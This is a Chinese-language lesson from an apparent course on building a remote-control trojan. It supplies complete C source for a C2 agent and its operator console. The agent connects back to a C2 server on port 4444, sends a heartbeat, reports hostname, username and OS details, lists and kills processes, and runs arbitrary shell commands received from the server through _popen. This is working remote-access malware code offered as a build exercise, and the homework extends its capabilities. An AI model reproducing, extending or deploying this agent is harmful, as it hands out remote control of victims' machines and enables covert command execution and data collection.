# 课时04：远控添加Client端进程信息获取功能

## 课程目标

1. 实现远程进程列表获取
2. 掌握进程信息的序列化传输
3. 实现远程进程管理功能
4. 完善C2通信协议

---

## 名词解释

| 术语 | 解释 |
|------|------|
| TLV | Type-Length-Value数据格式 |
| 序列化 | 将数据结构转换为字节流 |
| 心跳 | 定期发送的保活包 |
| 命令分发 | 根据命令类型执行不同功能 |

---

## 代码实现

### 示例1：通信协议定义

```c
// Protocol.h - 通信协议定义
#ifndef PROTOCOL_H
#define PROTOCOL_H

#include <windows.h>

#pragma pack(push, 1)

// 消息头
typedef struct _MSG_HEADER {
    DWORD   Magic;          // 魔数 0xDEADBEEF
    DWORD   Type;           // 消息类型
    DWORD   Length;         // 数据长度
    DWORD   Sequence;       // 序列号
} MSG_HEADER, *PMSG_HEADER;

// 消息类型
#define MSG_HEARTBEAT       0x0001
#define MSG_SYSINFO         0x0002
#define MSG_PROCESS_LIST    0x0010
#define MSG_PROCESS_KILL    0x0011
#define MSG_SHELL_EXEC      0x0020
#define MSG_FILE_LIST       0x0030
#define MSG_FILE_DOWNLOAD   0x0031
#define MSG_FILE_UPLOAD     0x0032

// 进程信息
typedef struct _PROCESS_INFO_PACKET {
    DWORD   Pid;
    DWORD   ParentPid;
    DWORD   ThreadCount;
    DWORD   Priority;
    CHAR    ExeName[260];
    CHAR    ExePath[520];
} PROCESS_INFO_PACKET, *PPROCESS_INFO_PACKET;

// 系统信息
typedef struct _SYSINFO_PACKET {
    CHAR    Hostname[64];
    CHAR    Username[64];
    CHAR    OsVersion[128];
    DWORD   ProcessorCount;
    DWORD   MemoryMB;
    CHAR    IpAddress[64];
} SYSINFO_PACKET, *PSYSINFO_PACKET;

#pragma pack(pop)

#define MSG_MAGIC 0xDEADBEEF

#endif
```

### 示例2：进程信息获取

```c
// ProcessInfo.c - 进程信息获取
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>
#include "Protocol.h"

#pragma comment(lib, "psapi.lib")

// 获取进程列表
DWORD GetProcessList(PPROCESS_INFO_PACKET* ppList) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD count = 0;
    DWORD capacity = 256;
    
    *ppList = (PPROCESS_INFO_PACKET)malloc(capacity * sizeof(PROCESS_INFO_PACKET));
    if (!*ppList) return 0;
    
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        free(*ppList);
        return 0;
    }
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (count >= capacity) {
                capacity *= 2;
                PPROCESS_INFO_PACKET newList = (PPROCESS_INFO_PACKET)realloc(
                    *ppList, capacity * sizeof(PROCESS_INFO_PACKET));
                if (!newList) break;
                *ppList = newList;
            }
            
            PPROCESS_INFO_PACKET info = &(*ppList)[count];
            memset(info, 0, sizeof(PROCESS_INFO_PACKET));
            
            info->Pid = pe32.th32ProcessID;
            info->ParentPid = pe32.th32ParentProcessID;
            info->ThreadCount = pe32.cntThreads;
            info->Priority = pe32.pcPriClassBase;
            
            // 复制进程名
            WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1,
                               info->ExeName, sizeof(info->ExeName), NULL, NULL);
            
            // 获取完整路径
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                DWORD pathLen = sizeof(info->ExePath);
                QueryFullProcessImageNameA(hProcess, 0, info->ExePath, &pathLen);
                CloseHandle(hProcess);
            }
            
            count++;
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return count;
}

// 终止进程
BOOL KillProcess(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hProcess) return FALSE;
    
    BOOL result = TerminateProcess(hProcess, 1);
    CloseHandle(hProcess);
    
    return result;
}

// 获取系统信息
void GetSystemInfoPacket(PSYSINFO_PACKET pInfo) {
    DWORD size;
    
    memset(pInfo, 0, sizeof(SYSINFO_PACKET));
    
    // 主机名
    size = sizeof(pInfo->Hostname);
    GetComputerNameA(pInfo->Hostname, &size);
    
    // 用户名
    size = sizeof(pInfo->Username);
    GetUserNameA(pInfo->Username, &size);
    
    // OS版本
    OSVERSIONINFOEXA osvi;
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    GetVersionExA((LPOSVERSIONINFOA)&osvi);
    sprintf_s(pInfo->OsVersion, sizeof(pInfo->OsVersion),
              "Windows %d.%d Build %d",
              osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    
    // 处理器数量
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    pInfo->ProcessorCount = sysInfo.dwNumberOfProcessors;
    
    // 内存
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    pInfo->MemoryMB = (DWORD)(memStatus.ullTotalPhys / (1024 * 1024));
}
```

### 示例3：C2 Agent完整实现

```c
// C2AgentFull.c - 完整Agent实现
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include "Protocol.h"

#pragma comment(lib, "ws2_32.lib")

#define C2_SERVER   "127.0.0.1"
#define C2_PORT     4444
#define HEARTBEAT_INTERVAL 30000

SOCKET g_Socket = INVALID_SOCKET;
BOOL g_Running = TRUE;
DWORD g_Sequence = 0;

// 发送消息
BOOL SendMessage(DWORD type, PVOID data, DWORD dataLen) {
    MSG_HEADER header;
    header.Magic = MSG_MAGIC;
    header.Type = type;
    header.Length = dataLen;
    header.Sequence = ++g_Sequence;
    
    // 发送头
    if (send(g_Socket, (char*)&header, sizeof(header), 0) != sizeof(header)) {
        return FALSE;
    }
    
    // 发送数据
    if (dataLen > 0 && data) {
        if (send(g_Socket, (char*)data, dataLen, 0) != dataLen) {
            return FALSE;
        }
    }
    
    return TRUE;
}

// 接收消息
BOOL RecvMessage(PMSG_HEADER pHeader, PVOID* ppData) {
    // 接收头
    int recvLen = recv(g_Socket, (char*)pHeader, sizeof(MSG_HEADER), 0);
    if (recvLen != sizeof(MSG_HEADER)) {
        return FALSE;
    }
    
    if (pHeader->Magic != MSG_MAGIC) {
        return FALSE;
    }
    
    // 接收数据
    *ppData = NULL;
    if (pHeader->Length > 0) {
        *ppData = malloc(pHeader->Length);
        recvLen = recv(g_Socket, (char*)*ppData, pHeader->Length, 0);
        if (recvLen != pHeader->Length) {
            free(*ppData);
            *ppData = NULL;
            return FALSE;
        }
    }
    
    return TRUE;
}

// 处理进程列表请求
void HandleProcessList() {
    PPROCESS_INFO_PACKET processList;
    DWORD count = GetProcessList(&processList);
    
    DWORD dataLen = count * sizeof(PROCESS_INFO_PACKET);
    SendMessage(MSG_PROCESS_LIST, processList, dataLen);
    
    free(processList);
}

// 处理终止进程
void HandleProcessKill(DWORD pid) {
    DWORD result = KillProcess(pid) ? 1 : 0;
    SendMessage(MSG_PROCESS_KILL, &result, sizeof(result));
}

// 处理Shell执行
void HandleShellExec(char* command) {
    char output[8192] = {0};
    FILE* pipe = _popen(command, "r");
    
    if (pipe) {
        int offset = 0;
        while (fgets(output + offset, sizeof(output) - offset, pipe)) {
            offset = strlen(output);
            if (offset >= sizeof(output) - 100) break;
        }
        _pclose(pipe);
    } else {
        strcpy_s(output, sizeof(output), "Failed to execute command");
    }
    
    SendMessage(MSG_SHELL_EXEC, output, strlen(output) + 1);
}

// 处理系统信息请求
void HandleSysInfo() {
    SYSINFO_PACKET info;
    GetSystemInfoPacket(&info);
    SendMessage(MSG_SYSINFO, &info, sizeof(info));
}

// 心跳线程
DWORD WINAPI HeartbeatThread(LPVOID lpParam) {
    while (g_Running) {
        if (g_Socket != INVALID_SOCKET) {
            SendMessage(MSG_HEARTBEAT, NULL, 0);
        }
        Sleep(HEARTBEAT_INTERVAL);
    }
    return 0;
}

// 连接服务器
BOOL ConnectToServer() {
    struct sockaddr_in serverAddr;
    
    g_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_Socket == INVALID_SOCKET) return FALSE;
    
    serverAddr.sin_family = AF_INET;
    inet_pton(AF_INET, C2_SERVER, &serverAddr.sin_addr);
    serverAddr.sin_port = htons(C2_PORT);
    
    if (connect(g_Socket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(g_Socket);
        g_Socket = INVALID_SOCKET;
        return FALSE;
    }
    
    // 发送系统信息
    HandleSysInfo();
    
    return TRUE;
}

// 主循环
void MainLoop() {
    MSG_HEADER header;
    PVOID data;
    
    // 启动心跳线程
    CreateThread(NULL, 0, HeartbeatThread, NULL, 0, NULL);
    
    while (g_Running) {
        if (g_Socket == INVALID_SOCKET) {
            if (!ConnectToServer()) {
                Sleep(5000);
                continue;
            }
        }
        
        if (!RecvMessage(&header, &data)) {
            closesocket(g_Socket);
            g_Socket = INVALID_SOCKET;
            continue;
        }
        
        switch (header.Type) {
            case MSG_PROCESS_LIST:
                HandleProcessList();
                break;
            case MSG_PROCESS_KILL:
                if (data) HandleProcessKill(*(DWORD*)data);
                break;
            case MSG_SHELL_EXEC:
                if (data) HandleShellExec((char*)data);
                break;
            case MSG_SYSINFO:
                HandleSysInfo();
                break;
        }
        
        if (data) free(data);
    }
}

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    MainLoop();
    
    if (g_Socket != INVALID_SOCKET) closesocket(g_Socket);
    WSACleanup();
    return 0;
}
```

### 示例4：C2 Server进程管理界面

```c
// C2ServerProcess.c - 服务器端进程管理
#include <winsock2.h>
#include <stdio.h>
#include "Protocol.h"

#pragma comment(lib, "ws2_32.lib")

void DisplayProcessList(PPROCESS_INFO_PACKET list, DWORD count) {
    printf("\n%-8s %-8s %-8s %-30s\n", "PID", "PPID", "Threads", "Name");
    printf("------------------------------------------------------------\n");
    
    for (DWORD i = 0; i < count; i++) {
        printf("%-8d %-8d %-8d %-30s\n",
               list[i].Pid,
               list[i].ParentPid,
               list[i].ThreadCount,
               list[i].ExeName);
    }
    
    printf("\nTotal: %d processes\n", count);
}

void DisplaySysInfo(PSYSINFO_PACKET info) {
    printf("\n=== System Information ===\n");
    printf("Hostname:    %s\n", info->Hostname);
    printf("Username:    %s\n", info->Username);
    printf("OS:          %s\n", info->OsVersion);
    printf("Processors:  %d\n", info->ProcessorCount);
    printf("Memory:      %d MB\n", info->MemoryMB);
    printf("IP Address:  %s\n", info->IpAddress);
}

// 请求进程列表
void RequestProcessList(SOCKET sock) {
    MSG_HEADER header;
    header.Magic = MSG_MAGIC;
    header.Type = MSG_PROCESS_LIST;
    header.Length = 0;
    header.Sequence = 1;
    
    send(sock, (char*)&header, sizeof(header), 0);
}

// 请求终止进程
void RequestKillProcess(SOCKET sock, DWORD pid) {
    MSG_HEADER header;
    header.Magic = MSG_MAGIC;
    header.Type = MSG_PROCESS_KILL;
    header.Length = sizeof(DWORD);
    header.Sequence = 1;
    
    send(sock, (char*)&header, sizeof(header), 0);
    send(sock, (char*)&pid, sizeof(pid), 0);
}
```

---

## 课后作业

1. 添加进程内存信息显示
2. 实现进程模块列表获取
3. 添加进程启动功能
4. 实现进程注入检测

---

## 扩展阅读

- Windows进程管理API
- 远程控制协议设计
- 安全通信实现
